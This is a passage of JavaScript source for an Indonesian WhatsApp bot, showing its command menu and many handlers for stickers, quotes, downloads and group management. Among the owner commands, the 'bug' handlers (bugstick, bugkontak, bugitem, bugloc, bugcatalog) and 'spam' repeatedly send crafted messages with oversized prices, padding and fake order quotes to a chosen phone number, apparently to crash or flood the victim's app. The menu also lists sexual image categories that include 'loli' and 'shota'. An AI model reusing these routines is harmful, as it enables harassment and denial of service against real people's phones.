 ${hitnya+=1} ✇ bloodglas <teks> 
 ${hitnya+=1} ✇ hallowen <teks> 
 ${hitnya+=1} ✇ darkgold <teks> 
 ${hitnya+=1} ✇ joker <teks> 
 ${hitnya+=1} ✇ wicker <teks>
 ${hitnya+=1} ✇ firework <teks> 
 ${hitnya+=1} ✇ skeleton <teks> 
 ${hitnya+=1} ✇ blackpink <teks> 
 ${hitnya+=1} ✇ sand <teks> 
 ${hitnya+=1} ✇ glue <teks> 
 ${hitnya+=1} ✇ 1917 <teks> 
 ${hitnya+=1} ✇ leaves <teks>
 
*RANDOM FOTO*
 ${hitnya+=1} ✇ aesthetic
 ${hitnya+=1} ✇ ahegao
 ${hitnya+=1} ✇ akira
 ${hitnya+=1} ✇ akiyama
 ${hitnya+=1} ✇ ana
 ${hitnya+=1} ✇ anjing
 ${hitnya+=1} ✇ art
 ${hitnya+=1} ✇ ass
 ${hitnya+=1} ✇ asuna
 ${hitnya+=1} ✇ ayuzawa
 ${hitnya+=1} ✇ bdsm
 ${hitnya+=1} ✇ boneka
 ${hitnya+=1} ✇ boruto
 ${hitnya+=1} ✇ bts
 ${hitnya+=1} ✇ cecan
 ${hitnya+=1} ✇ chiho
 ${hitnya+=1} ✇ chitoge
 ${hitnya+=1} ✇ cogan
 ${hitnya+=1} ✇ cosplay
 ${hitnya+=1} ✇ cosplayloli
 ${hitnya+=1} ✇ cosplaysagiri
 ${hitnya+=1} ✇ cuckold
 ${hitnya+=1} ✇ cum
 ${hitnya+=1} ✇ cyber
 ${hitnya+=1} ✇ darkjokes
 ${hitnya+=1} ✇ deidara
 ${hitnya+=1} ✇ doraemon
 ${hitnya+=1} ✇ eba
 ${hitnya+=1} ✇ elaina
 ${hitnya+=1} ✇ emilia
 ${hitnya+=1} ✇ ero
 ${hitnya+=1} ✇ erza
 ${hitnya+=1} ✇ exo
 ${hitnya+=1} ✇ femdom
 ${hitnya+=1} ✇ foot
 ${hitnya+=1} ✇ freefire
 ${hitnya+=1} ✇ gamewallpaper
 ${hitnya+=1} ✇ gangbang
 ${hitnya+=1} ✇ gifs
 ${hitnya+=1} ✇ glasses
 ${hitnya+=1} ✇ gremory
 ${hitnya+=1} ✇ hekel
 ${hitnya+=1} ✇ hentai
 ${hitnya+=1} ✇ hestia
 ${hitnya+=1} ✇ hijaber
 ${hitnya+=1} ✇ hinata
 ${hitnya+=1} ✇ husbu
 ${hitnya+=1} ✇ inori
 ${hitnya+=1} ✇ islamic
 ${hitnya+=1} ✇ isuzu
 ${hitnya+=1} ✇ itachi
 ${hitnya+=1} ✇ itori
 ${hitnya+=1} ✇ jahy
 ${hitnya+=1} ✇ jeni
 ${hitnya+=1} ✇ jiso
 ${hitnya+=1} ✇ justina
 ${hitnya+=1} ✇ kaga
 ${hitnya+=1} ✇ kagura
 ${hitnya+=1} ✇ kakasih
 ${hitnya+=1} ✇ kaori
 ${hitnya+=1} ✇ kartun
 ${hitnya+=1} ✇ katakata
 ${hitnya+=1} ✇ keneki
 ${hitnya+=1} ✇ kotori
 ${hitnya+=1} ✇ kpop
 ${hitnya+=1} ✇ kucing
 ${hitnya+=1} ✇ kurumi
 ${hitnya+=1} ✇ lisa
 ${hitnya+=1} ✇ loli
 ${hitnya+=1} ✇ madara
 ${hitnya+=1} ✇ masturbation
 ${hitnya+=1} ✇ megumin
 ${hitnya+=1} ✇ mikasa
 ${hitnya+=1} ✇ mikey
 ${hitnya+=1} ✇ miku
 ${hitnya+=1} ✇ milf
 ${hitnya+=1} ✇ minato
 ${hitnya+=1} ✇ mobil
 ${hitnya+=1} ✇ motor
 ${hitnya+=1} ✇ mountain
 ${hitnya+=1} ✇ naruto
 ${hitnya+=1} ✇ neko
 ${hitnya+=1} ✇ neko2
 ${hitnya+=1} ✇ nekonime
 ${hitnya+=1} ✇ nezuko
 ${hitnya+=1} ✇ onepiece
 ${hitnya+=1} ✇ orgy
 ${hitnya+=1} ✇ panties
 ${hitnya+=1} ✇ pentol
 ${hitnya+=1} ✇ pokemon
 ${hitnya+=1} ✇ profil
 ${hitnya+=1} ✇ programming
 ${hitnya+=1} ✇ pubg
 ${hitnya+=1} ✇ pussy
 ${hitnya+=1} ✇ randblackpink
 ${hitnya+=1} ✇ randomnime
 ${hitnya+=1} ✇ randomnime2
 ${hitnya+=1} ✇ renungan
 ${hitnya+=1} ✇ rize
 ${hitnya+=1} ✇ rose
 ${hitnya+=1} ✇ ryujin
 ${hitnya+=1} ✇ sagiri
 ${hitnya+=1} ✇ sakura
 ${hitnya+=1} ✇ sasuke
 ${hitnya+=1} ✇ satanic
 ${hitnya+=1} ✇ shina
 ${hitnya+=1} ✇ shinka
 ${hitnya+=1} ✇ shinomiya
 ${hitnya+=1} ✇ shizuka
 ${hitnya+=1} ✇ shota
 ${hitnya+=1} ✇ tatasurya
 ${hitnya+=1} ✇ technology
 ${hitnya+=1} ✇ tejina
 ${hitnya+=1} ✇ tentacles
 ${hitnya+=1} ✇ thighs
 ${hitnya+=1} ✇ toukachan
 ${hitnya+=1} ✇ tsunade
 ${hitnya+=1} ✇ waifu
 ${hitnya+=1} ✇ wallhp
 ${hitnya+=1} ✇ wallml
 ${hitnya+=1} ✇ wallnime
 ${hitnya+=1} ✇ yotsuba
 ${hitnya+=1} ✇ yuki
 ${hitnya+=1} ✇ yulibocil
 ${hitnya+=1} ✇ yumeko
 
*STALKER FITUR*
 ${hitnya+=1} ✇ npmstalk <kirbotz-api>
 ${hitnya+=1} ✇ instagramstalk <kirbotzx>
 ${hitnya+=1} ✇ githubstalk <KirBotz>
 ${hitnya+=1} ✇ ffstalk <946716486
 ${hitnya+=1} ✇ mlstalk <530793138|8129>

*DOWNLOAD FITUR*
 ${hitnya+=1} ✇ ytsearch <query>
 ${hitnya+=1} ✇ play <query>
 ${hitnya+=1} ✇ playmp4 <query>
 ${hitnya+=1} ✇ playmp3 <query>
 ${hitnya+=1} ✇ ythd <url>
 ${hitnya+=1} ✇ ytmp4 <url>
 ${hitnya+=1} ✇ ytmp3 <url>
 ${hitnya+=1} ✇ tiktok <url>
 ${hitnya+=1} ✇ mediafire <url>

*GROUP FITUR*
 ${hitnya+=1} ✇ linkgroup
 ${hitnya+=1} ✇ add <628×××>
 ${hitnya+=1} ✇ kick <@628×××>
 ${hitnya+=1} ✇ promote <@628×××>
 ${hitnya+=1} ✇ demote <@628×××>
 ${hitnya+=1} ✇ antilink <on/off>
 ${hitnya+=1} ✇ group <open/close>
 ${hitnya+=1} ✇ hidetag <teks>
 ${hitnya+=1} ✇ tagall <teks>
 ${hitnya+=1} ✇ setdescgroup <teks>
 ${hitnya+=1} ✇ setnamegroup <teks>
 ${hitnya+=1} ✇ setppgroup <reply foto>

*OWNER FITUR*
 ${hitnya+=1} > Eval
 ${hitnya+=1} => Eval
 ${hitnya+=1} $ Exec
 ${hitnya+=1} ✇ sendfile <package.json>
 ${hitnya+=1} ✇ ceksize <package.json>
 ${hitnya+=1} ✇ join <link group>
 ${hitnya+=1} ✇ autosticker <on/off>
 ${hitnya+=1} ✇ creategc <namagc>
 ${hitnya+=1} ✇ setppbot reply foto>
 ${hitnya+=1} ✇ addowner <628×××>
 ${hitnya+=1} ✇ delowner <628×××>
 ${hitnya+=1} ✇ bcvn
 ${hitnya+=1} ✇ bcall <teks>
 ${hitnya+=1} ✇ spam <10|10s>
 ${hitnya+=1} ✇ bugitem <628×××|10|10s>
 ${hitnya+=1} ✇ bugstick <628×××|10|10s>
 ${hitnya+=1} ✇ bugcatalog <628×××|10|10s>
 ${hitnya+=1} ✇ bugloc <628×××|10|10s>
 ${hitnya+=1} ✇ bugkontak <628×××|10|10s>
 
*LIST MESSAGE*
 ${hitnya+=1} ✇ list
 ${hitnya+=1} ✇ addlist
 ${hitnya+=1} ✇ dellist
 ${hitnya+=1} ✇ updatelist

*NOTE*
Gunakan Bot Dengan Bijak, User Yang Baik Adalah User Yang Bijak Melakukan Sesuatu`
let button = 
[
{ urlButton: { displayText: `Owner`, url : 'https://api.whatsapp.com/send?text=Hai%20Kak%20Fαυȥყ%20Ganteng&phone=6285791677204' } },
{ quickReplyButton: { displayText: `Donasi`, id: `.donasi` } },
{ quickReplyButton: { displayText: `Dashboard`, id: `.dashboard` } }
]
kirbotz.send5ButLoc(from, listkirbotz, `✇ Fαυȥყ WhatsApp ✇`, ppnyauser, button)
}
break
case prefix+'animesearch':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} boruto`)
anime(q).then(async data => {
let txt = `*-------「 ANIME-SEARCH 」-------*\n\n`
for (let i of data) {
txt += `*📫 Title :* ${i.judul}\n`
txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
}
let gam = await reSize(data[0].thumbnail.replace('https://www.anime-planet.com',''), 200, 200)
var but = [
{
"urlButton": {
"displayText": "Rest APIs",
"url": `https://kirbotz-api.herokuapp.com`
}
}
]
await kirbotz.send5ButLoc(from, txt , `Creator Akira`, gam, but , { userJid: m.chat, quoted: m })
})
.catch((err) => {
reply(err)
})
}
break
case prefix+'owner':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
kirbotz.sendContact(m.chat, owner, m)
}
break
case prefix+'readmore':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
var more = String.fromCharCode(8206)
var readMore = more.repeat(4001)
const rmoreteks1 = q.split('|')[0] ? q.split('|')[0] : q
const rmoreteks2 = q.split('|')[1] ? q.split('|')[1] : ''
reply(`${rmoreteks1}${readMore}${rmoreteks2}`)
}
break
case prefix+'bijak':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = require('./data/bijak.json')
let wahyu = res[Math.floor(Math.random() * res.length)]
let teks = `${wahyu}`
let buttons = [
{ buttonId: '.bijak', buttonText: { displayText: 'Next' }, type: 1 }
]
await kirbotz.sendButtonText(from, buttons, teks, kirbotz.user.name, m)
}
break
case prefix+'renungan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = require('./data/renungan.json')
let wahyu = res[Math.floor(Math.random() * res.length)]
let buttoons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1},
]
let buttonMessaage = {
image: { url: wahyu }, 
jpegThumbnail: ppnyauser,
caption: `Nih Kak @${sender.split("@")[0]}`,
fileLength: "999999999",
mentions:[sender],
footer: `_Powered By Fαυȥყ_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : FαυȥყRêålz', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}
}
kirbotz.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Fαυȥყ',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case prefix+'bucin':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = require('./data/bucin.json')
let wahyu = res[Math.floor(Math.random() * res.length)]
let teks = `${wahyu}`
let buttons = [
{ buttonId: '.bucin', buttonText: { displayText: 'Next' }, type: 1 }
]
await kirbotz.sendButtonText(from, buttons, teks, kirbotz.user.name, m)
}
break
case prefix+'truth':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = require('./data/truth.json')
let wahyu = res[Math.floor(Math.random() * res.length)]
let teks = `${wahyu}`
let buttons = [
{ buttonId: '.truth', buttonText: { displayText: 'Next' }, type: 1 }
]
await kirbotz.sendButtonText(from, buttons, teks, kirbotz.user.name, m)
}
break
case prefix+'dare':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = require('./data/dare.json')
let wahyu = res[Math.floor(Math.random() * res.length)]
let teks = `${wahyu}`
let buttons = [
{ buttonId: '.dare', buttonText: { displayText: 'Next' }, type: 1 }
]
await kirbotz.sendButtonText(from, buttons, teks, kirbotz.user.name, m)
}
break
case prefix+'quotes':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = await quotes.quotes()
let teks = `Quotes : ${res.quote}\nBy : ${res.by}`
let buttons = [
{ buttonId: '.quotes', buttonText: { displayText: 'Next' }, type: 1 }
]
await kirbotz.sendButtonText(from, buttons, teks, kirbotz.user.name, m)
}
break
case prefix+'quotesanime':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let res = await quotesanime.quotesanime()
let teks = `Quotes : ${res.quote}\nCharacter : ${res.character}\nAnime : ${res.anime}\nEpisode : ${res.episode}`
let buttons = [
{ buttonId: '.quotesanime', buttonText: { displayText: 'Next' }, type: 1 }
]
await kirbotz.sendButtonText(from, buttons, teks, kirbotz.user.name, m)
}
break
case prefix+'list':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessage = {
text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n🗓 Tanggal : ${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
footer: "List By Fαυȥყ",
buttonText: "Click Here!!!",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsg = await kirbotz.sendMessage(m.chat, listMessage)
break
case prefix+'autosticker':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args[0] == 'on') {
if (autosticker) return reply('*Sudah Aktif!*')
autosticker = true
reply('*Berhasil Mengaktifkan Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Belum Aktif!*')
autosticker = false
reply('*Berhasil Mematikan Autosticker*')
} else {
let buttons = [
{ buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
}
break
case prefix+'bcall':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!q) return reply(`Teks?`)
let teks = `${q}`
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
kirbotz.sendMessage(yoi, { text : teks, mentions: [m.sender] }, { quoted: lep })
}
}
break
case prefix+'bcvn':{
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
kirbotz.sendMessage(yoi, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: lep })
}
}
break
case prefix+'creategc': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!args.join(" ")) return reply(`Penggunaan ${prefix+command} namagroup`)
try {
let cret = await kirbotz.groupCreate(args.join(" "), [])
let response = await kirbotz.groupInviteCode(cret.id)
teks = `     「 Group Create Fitur 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

https://chat.whatsapp.com/${response}
       `
kirbotz.sendMessage(m.chat, { text:teks, mentions: await kirbotz.parseMention(teks)}, {quoted:m})
} catch {
reply("Error!")
}
}
break
case prefix+'addlist':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!itsKirBotz) return
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) { 
let media = await (m.quoted ? m.quoted : m).download()
var { result } = await require('./upload')(media)
addResponList(from, args1, args2, true, `${result.url}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break
case prefix+'dellist':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!itsKirBotz) return
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case prefix+'updatelist':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!itsKirBotz) return
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await (m.quoted ? m.quoted : m).download()
var { result } = await require('./upload')(media)
updateResponList(from, args1, args2, true, `${result.url}`, db_respon_list)
reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case prefix+'bugstick':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args.length == 0) return reply(`Penggunaan ${command} nomor|jumlah|timer\nContoh ${command} 628×××|5|5s`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
kirbotz.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'bugkontak':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args.length == 0) return reply(`Penggunaan ${command} nomor|jumlah|timer\nContoh ${command} 628×××|5|5s`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
kirbotz.sendContact(num, owner, lep)
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'bugitem': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
sendListBugfc(num, 'Hallo Kak', 'Aku Fαυȥყ', 'Minta Donasi Nya Donk Kak', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'bugloc': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kirbotz.waUploadToServer })
var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": "yt FαυȥყRêålz",
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": "hai",
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: from, quoted: lep })
kirbotz.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'bugcatalog': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kirbotz.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes Doank`,
"description": `${ngazap(prefix)}${ngazap(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
kirbotz.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'spam':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (args.length == 0) return reply(`Penggunaan ${command} jumlah\nContoh ${command} 5|10s`)
jumlah = q.split('|')[0]
waktu = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
kirbotz.sendMessage(from, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case prefix+'setppbot': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await kirbotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'kids'`) {
var { img } = await generateProfilePicturee(media)
await kirbotz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var memeg = await kirbotz.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
}
break
case prefix+'addowner':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!args[0]) return reply(`Contoh ${command} 628×××××`)
bnnd = `${args[0].replace('@', '')}`
owner.push(bnnd)
fs.writeFileSync('./owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case prefix+'delowner':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!args[0]) return reply(`Contoh ${command} 628×××××`)
ya = `${args[0].replace('@', '')}`
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case prefix+'join': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!text) return reply(`Contoh ${command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kirbotz.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'sendfile':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!q) return reply(`Nama File Nya Paan Kak???`)
let anu = fs.readFileSync(q)
kirbotz.sendMessage(m.chat, { document: anu, mimetype: 'application/octet-stream', fileName: `${q}`, jpegThumbnail: ppnyauser }, {quoted:m})  
}
break
case prefix+'ceksize':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!itsKirBotz) return
if (!q) return reply(`Nama File Nya Paan Kak???`)
let anu = await dbs.statDatabase(q)
reply(`Filename : ${anu.filename}
Filesize : ${anu.size}
Dibuat Pada Tanggal : ${anu.createdTime}`)
}
break
case prefix+'toimg': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${command}*`)
let media = await kirbotz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
kirbotz.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"jpegThumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'}}}, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case prefix+'tourl':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!isMedia) return reply(`Reply Media Dengan Perintah *${command}*`)
bucat = await (m.quoted ? m.quoted : m).download()
var { result } = await require('./upload')(bucat)
reply(`*SUCCESS*\n\nURL : \`\`\`${result.url}\`\`\``)
}
break
case prefix+'sticker': 
case prefix+'s': 
case prefix+'stickergif': 
case prefix+'sgif': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!quoted) reply(`Balas Video/Image Dengan Caption ${command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kirbotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kirbotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${command}\nDurasi Video 1-9 Detik`)
}
}
break
case prefix+'payment':
case prefix+'donasi':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
await sendListProduct(from, 'Hallo Kak', 'Aku Fauzi', 'Jika Mau Transfer Saldo Silahkan Pencet Item Di Bawah Makasih >_<', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
}
break
case prefix+'mp4':{
if (!q) return reply(`Link Nya Kak???`)
let res = await tiktok(q)
kirbotz.sendMessage(from, { video: { url: res.nowm } }, { quoted: m } )
}
break
case prefix+'mp3':{
if (!q) return reply(`Link Nya Kak???`)
let res = await tiktok(q)
reply(`Nih Kak Download Sendiri Aja Jangan Manja
${res.audio}`)
}
break
case prefix+'tiktok':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Link Nya Kak???`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Contoh ${command} https://vt.tiktok.com/ZSdEcETNx/?k=1`)
let res = await tiktok(q)
let buttoons = [
{buttonId: `.mp4 ${q}`, buttonText: {displayText: 'Video'}, type: 1},
{buttonId: `.mp3 ${q}`, buttonText: {displayText: 'Audio'}, type: 1}
]
let buttonMessaage = {
image: { url: res.thumbnail }, 
jpegThumbnail: ppnyauser,
caption: `Title : ${res.title}
Author : ${res.author}`,
fileLength: "999999999",
mentions:[sender],
footer: `_Powered By Fαυȥყ_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : FαυȥყRêålz', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}
}
kirbotz.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
